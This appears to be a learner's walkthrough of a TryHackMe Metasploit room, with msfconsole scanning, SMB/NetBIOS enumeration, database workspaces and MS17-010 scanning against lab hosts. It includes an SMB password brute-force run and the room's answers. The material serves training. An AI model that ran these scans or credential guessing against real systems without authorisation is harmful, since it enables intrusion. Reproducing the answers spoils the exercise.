# Metasploit: Exploitation
Using Metasploit for scanning, vulnerability assessment and exploitation.

## Task 1 Introduction
In this room, we will explore how to effectively use Metasploit for vulnerability scanning and exploitation. You’ll learn how to leverage Metasploit’s powerful features to identify and exploit vulnerabilities, and how its integrated database can help streamline and manage penetration testing engagements with a wider scope. Additionally, we’ll cover how to generate payloads using msfvenom and establish a Meterpreter session across various target platforms.

### Key Topics Covered:
- Scanning target systems using Metasploit
- Utilizing the Metasploit database for efficient engagement management
- Performing vulnerability scans with Metasploit
- Exploiting vulnerable services on target systems
- Generating payloads with msfvenom and initiating Meterpreter sessions

Note: For all tasks involving brute-force attacks or other scenarios requiring a wordlist, we will use the predefined wordlist available on the AttackBox at the following path:
/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt

If you are using your own machine, please download the wordlist using the Download Task Files button located to the right of this page.

To follow along, launch the AttackBox and start Metasploit by running the msfconsole command.

## Task 2 Scanning
### Port Scanning

Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the search portscan command.

```bash
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
```

Port scanning modules will require to set a few options:

```bash
msf6 > use 5
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


View the full module info with the info, or info -d command.

```

**Key Configuration Options:**
- CONCURRENCY: Sets how many targets will be scanned at the same time. Increasing this value can help speed up the scanning process when dealing with multiple systems.
- PORTS: Defines the range of port numbers to be scanned. Note that specifying 1-1000 in Metasploit scans ports 1 through 1000 in order, whereas Nmap (by default) scans the 1000 most commonly used ports, which may not be in order.
- RHOSTS: Indicates the target IP address or network you want to scan.
- THREADS: Determines how many threads will run in parallel during the scan. Using more threads can make the scan faster, but may use more system resources.

You can directly perform Nmap scans from the msfconsole prompt as shown below faster:

```bash
msf6 auxiliary(scanner/portscan/tcp) > nmap -sS 10.10.249.226
[*] exec: nmap -sS 10.10.249.226

Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-24 18:15 BST
Nmap scan report for 10.10.249.226
Host is up (0.00020s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
MAC Address: 02:DD:79:67:FD:2F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
msf6 auxiliary(scanner/portscan/tcp) > 
```

While Metasploit may not be the fastest option for port scanning, it still offers several useful modules that make it a valuable tool during the information-gathering phase.

### UDP service Identification
The scanner/discovery/udp_sweep module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

```bash
msf6 auxiliary(scanner/discovery/udp_sweep) > set RHOSTS 10.10.249.226
RHOSTS => 10.10.249.226
msf6 auxiliary(scanner/discovery/udp_sweep) > run
[*] Sending 13 probes to 10.10.249.226->10.10.249.226 (1 hosts)
[*] Discovered NetBIOS on 10.10.249.226:137 (ACME IT SUPPORT:<00>:G :ACME IT SUPPORT:<1e>:G :IP-10-10-249-22:<00>:U :IP-10-10-249-22:<03>:U :IP-10-10-249-22:<20>:U :00:00:00:00:00:00)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/udp_sweep) > 
```

### SMB Scans
Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be smb_enumshares and smb_version but please spend some time to identify scanners that the Metasploit version installed on your system offers.

```bash
msf6 auxiliary(scanner/smb/smb_version) > set  RHOSTS 10.10.249.226
RHOSTS => 10.10.249.226
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 10.10.249.226:445     - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{00000000-0000-0000-0000-000000000000}) (authentication domain:IP-10-10-249-226)
[+] 10.10.249.226:445     -   Host is running Version 6.1.0 (unknown OS)
[*] 10.10.249.226         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 

```
When conducting service scans, it's important not to overlook less common services like NetBIOS. NetBIOS (Network Basic Input/Output System) is similar to SMB and allows systems on a network to share files or send data to printers. The NetBIOS name of a target machine can often hint at its function or significance within the network (e.g., names like CORP-DC, DEVOPS, or SALES). You might also discover shared folders or files, some of which could be accessible without a password or protected by weak credentials like admin, administrator, root, or toor.

Metasploit includes a wide range of modules designed to help you better understand your target system and potentially uncover vulnerabilities. It's always a good idea to run a quick search in Metasploit to check for any relevant modules based on what you’ve learned about the target.

### Question 1:
How many ports are open on the target system?

**Answer:** 5

### Question 2:
Using the relevant scanner, what NetBIOS name can you see?

**Answer:** ACME IT SUPPORT

```bash
msf6 > search NetBIOS

Matching Modules
================

   #  Name                                          Disclosure Date  Rank    Check  Description
   -  ----                                          ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/ntlm_info_enumeration  .                normal  No     Host Information Enumeration via NTLM Authentication
   1  auxiliary/spoof/llmnr/llmnr_response          .                normal  No     LLMNR Spoofer
   2  auxiliary/scanner/netbios/nbname              .                normal  No     NetBIOS Information Discovery
   3  auxiliary/spoof/nbns/nbns_response            .                normal  No     NetBIOS Name Service Spoofer
   4  auxiliary/server/netbios_spoof_nat            2016-06-14       normal  No     NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel)
   5  auxiliary/admin/netbios/netbios_spoof         .                normal  No     NetBIOS Response Brute Force Spoof (Direct)
   6  auxiliary/dos/smb/smb_loris                   2017-06-29       normal  No     SMBLoris NBSS Denial of Service
   7  auxiliary/server/wpad                         .                normal  No     WPAD.dat File Server


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/server/wpad
```
Using auxiliary/scanner/netbios/nbname to find out name as the scanner describe it self infomation discovery
```bash
msf6 > use 2
msf6 auxiliary(scanner/netbios/nbname) > show options

Module options (auxiliary/scanner/netbios/nbname):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      137              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/netbios/nbname) > set RHOSTS 10.10.249.226
RHOSTS => 10.10.249.226
msf6 auxiliary(scanner/netbios/nbname) > run
[*] Sending NetBIOS requests to 10.10.249.226->10.10.249.226 (1 hosts)
[+] 10.10.249.226 [IP-10-10-249-22] OS:Unix Names:(ACME IT SUPPORT, IP-10-10-249-22) Addresses:(10.10.249.226) Mac:00:00:00:00:00:00 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### Question 3:
What is running on port 8000?

**Answer:** webfs/1.21

```bash
msf6 > search http_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/http_version  .                normal  No     HTTP Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/http_version
```

Use this to find out http version

```bash
msf6 > use 0
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 10.10.249.226
RHOSTS => 10.10.249.226
msf6 auxiliary(scanner/http/http_version) > run
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
I run after setting RHOSTS but I needed to set RPORT to 8000 and it was set to 80 by default
```bash
msf6 auxiliary(scanner/http/http_version) > show options

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.249.226    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host


View the full module info with the info, or info -d command.
```

### Question 4:
What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.

**Answer:** leo1234

First search smb_login

```bash
msf6 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login  .                normal  No     SMB Login Check Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login
```

```bash
msf6 > use 0
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf6 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   ANONYMOUS_LOGIN    false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   CreateSession      false            no        Create a new session for every successful login
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS             10.10.249.226    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```
Now we'll set required options

we have to set our RHOST too in my case I have already did in start

```bash
msf6 auxiliary(scanner/smb/smb_login) > set SMBuser penny
SMBuser => penny
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
PASS_FILE => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
msf6 auxiliary(scanner/smb/smb_login) > 
```

Now run

```bash
msf6 auxiliary(scanner/smb/smb_login) > run
[*] 10.10.249.226:445     - 10.10.249.226:445 - Starting SMB login bruteforce
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:95',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:98',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:2003',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:2008',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:111111',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:123456',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:12345678',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:1qaz2wsx',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:abc',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:abc123',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:abcd123',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:account',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:admin',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:adminadmin',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:administator',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:admins',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:air',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:alpine',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2013',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2013',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2014',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2014',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2015',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2015',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2016',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2016',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:Autumn2017',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:autumn2017',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:bankbank',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:baseball',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:basketball',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:bird',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:burp',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:change',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:changelater',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:changeme',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company!',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company1',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company1!',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:company123',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complex',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complex1',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complex2',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complex3',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:complexpassword',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:database',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:default',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:dev',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:devdev',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:devdevdev',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:dirt',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:dragon',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:earth',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:fire',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:football',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:goat',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:goat',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:god',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:guessme',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:hugs',
[-] 10.10.249.226:445     - 10.10.249.226:445 - Failed: '.\penny:letmein',
[+] 10.10.249.226:445     - 10.10.249.226:445 - Success: '.\penny:leo1234'
[*] 10.10.249.226:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.249.226:445     - Bruteforce completed, 1 credential was successful.
[*] 10.10.249.226:445     - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_login) > 
```

## Task 3 The Metasploit Database

While it is not required when interacting with a single target on TryHackMe, an actual penetration testing engagement will likely have several targets.

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.

Please note the following steps have already been taken in the TryHackMe AttackBox, so you will only need to do this if you are using Kali or have installed Metasploit yourself.

You will first need to start the PostgreSQL database, which Metasploit will use with the following command: systemctl start postgresql.

Then you will need to initialize the Metasploit Database using the msfdb init command. However, trying to run msfdb init as root will give the following error message, "Please run msfdb as a non-root user." This can be solved by running it as the postgres account using sudo -u postgres msfdb init.

The terminal below shows the example output. As mentioned, the steps below have already been performed on the AttackBox; however, if you are interested in repeating them, you will need to delete the existing database first using sudo -u postgres msfdb delete.

**Starting Postgresql**
```bash
root@attackbox:~# systemctl start postgresql 
root@attackbox:~# sudo -u postgres msfdb init
Running the 'init' command for the database:
Creating database at /var/lib/postgresql/.msf4/db
Creating db socket file at /tmp
Starting database at /var/lib/postgresql/.msf4/db...waiting for server to start.... done
server started
success
Creating database users
Writing client authentication configuration file /var/lib/postgresql/.msf4/db/pg_hba.conf
Stopping database at /var/lib/postgresql/.msf4/db
Starting database at /var/lib/postgresql/.msf4/db...waiting for server to start.... done
server started
success
Creating initial database schema
Database initialization successful
root@attackbox:~#
```
You can now launch msfconsole and check the database status using the db_status command.

**Checking the database status**
```bash
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 >
```

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the workspace command.

**Listing workspaces**
```bash
msf6 > workspace
* default
msf6 >
```

You can add a workspace using the -a parameter or delete a workspace using the -d parameter, respectively. The screenshot below shows that a new workspace named "tryhackme" was created.

**Adding a workspace**
```bash
msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf5 > workspace
default
* tryhackme
msf6 >
```


You will also notice that the new database name is printed in red, starting with a * symbol.

You can use the workspace command to navigate between workspaces simply by typing workspace followed by the desired workspace name.

**Changing workspaces**
```bash
msf6 > workspace
default
* tryhackme
msf5 > workspace default
[*] Workspace: default
msf5 > workspace 
tryhackme
* default
msf6 >
```

You can use the workspace -h command to list available options for the workspace command.

**Workspace help menu**
```bash
msf6 > workspace -h
Usage:
workspace                  List workspaces
workspace -v               List workspaces verbosely
workspace [name]           Switch workspace
workspace -a [name] ...    Add workspace(s)
workspace -d [name] ...    Delete workspace(s)
workspace -D               Delete all workspaces
workspace -r     Rename workspace
workspace -h               Show this help information
```

Different from regular Metasploit usage, once Metasploit is launched with a database, the help command, you will show the Database Backends Commands menu.

**Database backend commands**
```bash
Database Backend Commands
=========================

Command           Description
-------           -----------
analyze           Analyze database information about a specific address or address range
db_connect        Connect to an existing data service
db_disconnect     Disconnect from the current data service
db_export         Export a file containing the contents of the database
db_import         Import a scan result file (filetype will be auto-detected)
db_nmap           Executes nmap and records the output automatically
db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
db_remove         Remove the saved data service entry
db_save           Save the current data service connection as the default to reconnect on startup
db_status         Show the current data service status
hosts             List all hosts in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces
```

If you run a Nmap scan using the db_nmap shown below, all results will be saved to the database.

**The db_nmap command**
```bash
msf6 > db_nmap -sV -p- 10.10.12.229
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-20 03:15 UTC
[*] Nmap: Nmap scan report for ip-10-10-12-229.eu-west-1.compute.internal (10.10.12.229)
[*] Nmap: Host is up (0.00090s latency).
[*] Nmap: Not shown: 65526 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49162/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: MAC Address: 02:CE:59:27:C8:E3 (Unknown)
[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 94.91 seconds
```

You can now reach information relevant to hosts and services running on target systems with the hosts and services commands, respectively. 

**Hosts and services**
```bash
msf6 > hosts

Hosts
=====

address       mac                name                                        os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----                                        -------  ---------  -----  -------  ----  --------
10.10.12.229  02:ce:59:27:c8:e3  ip-10-10-12-229.eu-west-1.compute.internal  Unknown                    device         

msf6 > services
Services
========

host          port   proto  name               state  info
----          ----   -----  ----               -----  ----
10.10.12.229  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.12.229  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.12.229  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.12.229  3389   tcp    ssl/ms-wbt-server  open   
10.10.12.229  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.12.229  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.12.229  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.12.229  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.12.229  49162  tcp    msrpc              open   Microsoft Windows RPC

msf6 >
```


The hosts -h and services -h commands can help you become more familiar with available options. Once the host information is stored in the database, you can use the hosts -R command to add this value to the RHOSTS parameter.

Example Workflow

We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the use auxiliary/scanner/smb/smb_ms17_010 command.
We set the RHOSTS value using hosts -R.
We have typed show options to check if all values were assigned correctly. (In this example, 10.10.138.32 is the IP address we have scanned earlier using the db_nmap command)
Once all parameters are set, we launch the exploit using the run or exploit command. 

**Using saved hosts**
```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf5 auxiliary(scanner/smb/smb_ms17_010) > hosts -R 

Hosts
=====

address       mac                name                                        os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----                                        -------  ---------  -----  -------  ----  --------
10.10.12.229  02:ce:59:27:c8:e3  ip-10-10-12-229.eu-west-1.compute.internal  Unknown                    device         

RHOSTS => 10.10.12.229

msf6 auxiliary(scanner/smb/smb_ms17_010) > show options 

Module options (auxiliary/scanner/smb/smb_ms17_010):

Name         Current Setting                                                 Required  Description
----         ---------------                                                 --------  -----------
CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
RHOSTS       10.10.12.229                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
RPORT        445                                                             yes       The SMB service port (TCP)
SMBDomain    .                                                               no        The Windows domain to use for authentication
SMBPass                                                                      no        The password for the specified username
SMBUser                                                                      no        The username to authenticate as
THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

If there is more than one host saved to the database, all IP addresses will be used when the hosts -R command is used. 
In a typical penetration testing engagement, we could have the following scenario: 

Finding available hosts using the db_nmap command
Scanning these for further vulnerabilities or open ports (using a port scanning module) 
The services command used with the -S parameter will allow you to search for specific services in the environment.

**Querying the database for services**
```bash
msf6 > services -S netbios                                                                                       
Services                                                                                                             
========                                                                                                             
                                                                                                                
host          port  proto  name         state  info                                                                              
----          ----  -----  ----         -----  ----                                                                              
10.10.12.229  139   tcp    netbios-ssn  open   Microsoft Windows netbios-ssn

msf6 >
```

You may want to look for low-hanging fruits such as:

- HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
- FTP: Could allow anonymous login and provide access to interesting files.
- SMB: Could be vulnerable to SMB exploits like MS17-010
- SSH: Could have default or easy to guess credentials
- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 

As you can see, Metasploit has many features to aid in engagements such as the ability to compartmentalize your engagements into workspaces, analyze your results at a high level, and quickly import and explore data.

## Task 4 Vulnerability Scanning

Metasploit can help you quickly identify critical vulnerabilities, often referred to as “low-hanging fruit.” These are common, easy-to-find weaknesses that may allow initial access to a system—and in some cases, even lead to high-level privileges like root or administrator access.

Effectively finding vulnerabilities with Metasploit depends largely on how well you scan and fingerprint the target system. The more accurate your information gathering, the more useful Metasploit becomes.

For instance, if you discover a VNC service running on a target, you can use Metasploit’s search function to look for related modules. While the search results may include payloads and post-exploitation modules, they won't be useful unless an actual exploit is identified. However, in the case of VNC, Metasploit does offer several scanner modules that can assist in further probing the service.

**Example: VNC scanning modules**
```bash
msf6 > use auxiliary/scanner/vnc/

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/vnc/ard_root_pw    .                normal  No     Apple Remote Desktop Root Vulnerability
   1  auxiliary/scanner/vnc/vnc_none_auth  .                normal  No     VNC Authentication None Detection
   2  auxiliary/scanner/vnc/vnc_login      .                normal  No     VNC Authentication Scanner


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/vnc/vnc_login
```

We can use the info command for any module to have a better understanding of its use and purpose.

**VNC login scanner**
```bash
msf6 > use 2
msf6 auxiliary(scanner/vnc/vnc_login) > info

       Name: VNC Authentication Scanner
     Module: auxiliary/scanner/vnc/vnc_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  carstein <carstein.sec@gmail.com>
  jduck <jduck@metasploit.com>

Check supported:
  No

Basic options:
  Name              Current Setting                                  Required  Description
  ----              ---------------                                  --------  -----------
  ANONYMOUS_LOGIN   false                                            yes       Attempt to login with a blank username and password
  BLANK_PASSWORDS   false                                            no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                                                yes       How fast to bruteforce, from 0 to 5
  DB_ALL_CREDS      false                                            no        Try each user/password couple stored in the current database
  DB_ALL_PASS       false                                            no        Add all passwords in the current database to the list
  DB_ALL_USERS      false                                            no        Add all users in the current database to the list
  DB_SKIP_EXISTING  none                                             no        Skip existing credentials stored in the current database (Accepted: none, user, user&rea
                                                                               lm)
  PASSWORD                                                           no        The password to test
  PASS_FILE         /opt/metasploit-framework/embedded/framework/da  no        File containing passwords, one per line
                    ta/wordlists/vnc_passwords.txt
  Proxies                                                            no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
                                                                               etasploit.html
  RPORT             5900                                             yes       The target port (TCP)
  STOP_ON_SUCCESS   false                                            yes       Stop guessing when a credential works for a host
  THREADS           1                                                yes       The number of concurrent threads (max one per host)
  USERNAME          <BLANK>                                          no        A specific username to authenticate as
  USERPASS_FILE                                                      no        File containing users and passwords separated by space, one pair per line
  USER_AS_PASS      false                                            no        Try the username as the password for all users
  USER_FILE                                                          no        File containing usernames, one per line
  VERBOSE           true                                             yes       Whether to print output for all attempts

Description:
  This module will test a VNC server on a range of machines and
  report successful logins. Currently it supports RFB protocol
  version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response
  authentication method.

References:
